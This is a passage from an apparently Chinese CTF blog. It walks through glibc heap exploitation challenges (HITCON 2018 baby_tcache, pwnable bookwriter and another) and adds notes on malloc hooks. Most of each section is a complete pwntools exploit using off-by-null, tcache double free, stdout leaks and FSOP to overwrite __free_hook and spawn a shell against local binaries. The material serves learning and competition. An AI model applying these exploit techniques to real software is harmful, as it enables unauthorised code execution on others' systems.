class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./eh&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size, content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(content) &gt;= size:</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p.sendline(content)</span><br><span class="line">          </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">return</span> p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#第一步，构造堆大致布局,哪些chunk进入tcahce那些进入unsorted十分重要</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;abcd&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">delete(i)</span><br><span class="line">   </span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#防止unsorted与top合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">9</span>):</span><br><span class="line">delete(i)</span><br><span class="line">   </span><br><span class="line"><span class="comment">#其实微微调整其他类似布局也是可以的</span></span><br><span class="line"><span class="comment">#此时三个unsorted已经合并完成，并且末尾的unosrted的prev_size已被修改为0x200</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二步，开始利用off-by-null</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)<span class="comment">#into tcache</span></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#into unsorted</span></span><br><span class="line">new(<span class="number">0xf8</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#get prev-8 which changed to 0 and put null in next&#x27;s prev_size fields</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#trigger </span></span><br><span class="line"><span class="comment">#这几个顺序很重要</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#get prev-7 and incise the big chunk made 0&#x27;s fd,bk writed</span></span><br><span class="line">libc_leak = u64(show(<span class="number">0</span>).strip().ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">libc.address = libc_leak - <span class="number">0x3ebca0</span> <span class="comment">#get from gdb</span></span><br><span class="line"><span class="comment"># assign libc.address could admit us not to plus libc_base</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line"><span class="comment">#上面两个操作说是绕过检测，即因为之后会取出三次，则counts必然要符合条件，则至少要释放三次，因此上面的操作去掉一个也是可以的</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment"># 0 amd 9 point to the same chunk</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#double free made point to itself</span></span><br><span class="line">new(<span class="number">0x10</span>, p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>])) <span class="comment"># 0 lifo find chunk by fd</span></span><br><span class="line">new(<span class="number">0x10</span>, <span class="string">b&#x27;win&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4f302</span></span><br><span class="line">new(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&quot;/bin/sh\x00&quot;)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>小记0xb-0xc</strong></p><p>顺便学了个新技巧,libc.address在赋值为libcbase后,再得到的地址就已经自动加上了libcbase,不用另外自己加</p><p>其实有tcache的思路与无大差不差,只是存在一个优先级十分高的tcache,影响思路的具体执行</p><h2 id="HITCON-2018-PWN-baby-tcache"><a href="#HITCON-2018-PWN-baby-tcache" class="headerlink" title="HITCON 2018 PWN baby_tcache"></a>HITCON 2018 PWN baby_tcache</h2><p><strong>难度:★★★★</strong></p><p>保护全开</p><p>程序十分简单只有两个功能,malloc与free,不过程序越简单不代表越好,因为没有show函数,要想泄露信息变得难上加难</p><p>程序自带一个可能的off-by-null</p><p>wiki提供了两种思路,第一种需要爆破,第二种利用了io_file的知识,选择第二种</p><p>_IO_2_1_stdout等结构体位于libc段中,main_arena也位于libc段中,那么他们就有固定的偏移,并且这个偏移量并不太大,依此可以部分写达到目的,</p><p>_IO_2_1_stdout和main_arena除了后12位皆相等,不过我们只能写16位,这也就意味着exp只有十六分之一的成功率</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./bt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.binary=<span class="string">&#x27;./bt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(num).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size,data=<span class="string">b&#x27;abc&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Size:&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">new(<span class="number">0x500</span>-<span class="number">0x8</span>)  <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x30</span>)<span class="comment">#1</span></span><br><span class="line">new(<span class="number">0x40</span>)<span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x50</span>)<span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line">new(<span class="number">0x4f8</span>)<span class="comment">#5</span></span><br><span class="line">new(<span class="number">0x70</span>)<span class="comment">#6 avoid consolidate with top</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">new(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+<span class="string">b&#x27;\x60\x06&#x27;</span>)  <span class="comment">#4  put null in 5</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#into tcache，切割后fd和bk写入unsorted</span></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#写fd????</span></span><br><span class="line">delete(<span class="number">5</span>)  <span class="comment">#unsorted and trigger consolidate 0 1 2 3 4 </span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x530</span>) <span class="comment">#使2的fd变为unsorted  idx-&gt;0</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)<span class="comment"># into tcache </span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">new(<span class="number">0xa8</span>, <span class="string">b&#x27;\x60\x27&#x27;</span>)<span class="comment">#2760覆写2的fd部分,碰撞低地址16位,成功概率十六分之一</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x40</span>)<span class="comment">#取出 2-&gt;idx 4</span></span><br><span class="line">new(<span class="number">0x3e</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#把stdout取出来了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(p.recv(<span class="number">8</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak!!!!!!!!!&quot;</span>)</span><br><span class="line">info1 = p.recv(<span class="number">8</span>)<span class="comment">#观测得知这里是我们要的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(info1))</span><br><span class="line">libc.address = u64(info1) - <span class="number">0x3ed8b0</span></span><br><span class="line">log.info(<span class="string">&quot;libc @ &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0xa8</span>, p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment">#4 的fd</span></span><br><span class="line">new(<span class="number">0x60</span>)<span class="comment">#取出4-&gt;idx 6</span></span><br><span class="line">new(<span class="number">0x60</span>, p64(libc.address + <span class="number">0x4f302</span>)) <span class="comment"># one gadget with $rsp+0x40 = NULL再取出freehook-fakechunk</span></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment">#trigger</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>挺难的,结合了io_file的知识</p><h2 id="pwnable-bookwriter"><a href="#pwnable-bookwriter" class="headerlink" title="pwnable_bookwriter"></a>pwnable_bookwriter</h2><p><strong>难度:★★★</strong></p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bw&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>libc是2.23</p><p>主要漏洞点:</p><ol><li>根据内存判断应该只能存储8个book,但是add函数判断时是if(a&gt;8)结合函数功能会将一个book的size覆写为一个地址(一个很大的数值)</li><li>edit函数后会将book的size根据新输入的字符串调整,如果和下一个chunk的size连接起来就可以多写一个字节到下一个chunk</li><li>author长度为0x40时,可以向下继续泄露地址</li></ol><p>利用核心:</p><ol><li>这题没有free功能,要想泄露libc就要对topchunk动手脚(本体可以修改其大小,再申请一个比修改后的size大的大小,使topchunk加入unsortedbin)</li><li>具体的漏洞利用实现要用到FSOP</li></ol><p>实现过程:</p><ol><li>泄露heap</li><li>通过topchunk进入unsortedbin泄露libc</li><li>第0个chunk大数字写伪造io_file和vtable</li><li>申请chunk利用unsortedbin attack写IO_file并让fake_iofile加入到smallbin链并成功进入fake_io_list_all,并因为unsortedbin链损坏触发malloc_printer以此getshell</li></ol><p>触发trigger(将IO_list_all-0x10视为chunk起始的话,size==0)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                           chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p><strong>exp:</strong>(有小概率失败,可能是aslr的影响)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf= ELF(<span class="string">&quot;./bw&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./bw&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;page :&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Author :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)  <span class="comment">#top chunk size edit</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xe1\x0f\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(yes:1 / no:0) &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#add top chunk to unsorted bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">view(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">libc_addr  = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_base: &#x27;</span>, <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_addr:&#x27;</span>, <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;system: &#x27;</span>,<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;heap: &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;_IO_list_all: &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x2b0</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">vtable = heap_addr + <span class="number">0x2b0</span> +<span class="number">0xe0</span></span><br><span class="line">payload += p64(vtable)</span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,data + payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Size of page :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>小记0xf</strong></p><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><h2 id="0x1chunk地址"><a href="#0x1chunk地址" class="headerlink" title="0x1chunk地址"></a>0x1chunk地址</h2><p>大多程序(有缓冲)在运行中进行第一次io操作时<u><strong>(i操作申请一个,o操作申请一个)</strong></u>,都会申请两个chunk(应该是stdin和stdout的缓冲区)</p><p>不过还不确定跟环境有没有关系</p><p><strong>已知：</strong></p><ol><li>如果程序有setbuf(stdin/stdout/stderr,0)操作的话就只会申请一个chunk了,且是大小结尾为0x90那个(应该是stdout的缓冲区)，对单独程序可以先行调试看看——-<strong><u>与setbuf有关</u></strong></li><li>又发现有没有这两个chunk还跟<strong>动态库libc和动态链接器ld的版本有关系</strong>，原装环境存在iochunk,但在切换动态版本后却没有这两个chunk，切换动态库和链接器后再次调试确定———<strong><u>与动态版本有关</u></strong></li><li>还与程序唤起方式有关<strong>,gdb唤起</strong>与<strong>pwntools唤起</strong>亦有差异,二者可能一个有一个没有——-<strong><u>与唤起方式有关</u></strong></li></ol><p>在固定环境下,由于页对齐的原因,申请的chunk的地址低位一般都是固定的,可以用gdb观测,依此通过partial overwrite等我们能够达到许多目的</p><h2 id="0x2hook执行参数"><a href="#0x2hook执行参数" class="headerlink" title="0x2hook执行参数"></a>0x2hook执行参数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//_libc_free</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="comment">//_libc_malloc</span></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"><span class="comment">//_libc_realloc</span></span><br></pre></td></tr></table></figure><p>可以看到,hook不为空时,执行hook指向函数时的参数是由其包装函数决定的</p><ol><li>free执行时,是以所要释放chunk的mem指针作为参数</li><li>malloc和realloc都是以申请chunk大小(用户申请,非实际大小)为参数</li></ol><p>对于2来说,hook基本只能是onegadget了</p><p>但对于1来说,若在chunk中填入一些字符(如/bin/sh),则<strong>除了onegadget外,也可以直接调用system等函数</strong>,这题就是这样</p><h2 id="0x3mmap所分配chunk"><a href="#0x3mmap所分配chunk" class="headerlink" 